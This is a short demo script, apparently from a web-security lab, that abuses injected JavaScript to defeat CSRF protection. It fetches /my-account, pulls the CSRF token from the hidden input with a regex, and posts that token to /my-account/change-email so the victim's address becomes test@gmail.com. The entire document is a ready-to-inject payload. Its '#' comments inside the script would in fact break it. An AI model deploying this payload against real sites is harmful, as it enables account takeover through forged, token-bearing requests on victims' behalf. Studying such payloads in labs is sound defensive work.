#Demo - Steal CSRF Token and send request with stolen CSRF Token to bypass CSRF Token protection



<script>

var xhr = new XMLHttpRequest();													 #create XMLHttpRequest
xhr.open('GET', '/my-account', true);											 #send reqeust where CSRF token is stored in hidden input

xhr.onload = function () {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];           #steal CSRF token from hidden input on "/my-account" page
  var changeReq = new XMLHttpRequest();											 #create new XMLHttpRequest
  changeReq.open('POST', '/my-account/change-email', true);						 #send POST request to mail change functional
  changeReq.send('mail=test@gmail.com&csrf='+token+'');                          #send POST data with stolen CSRF token
  
};

xhr.send(null);


</script>

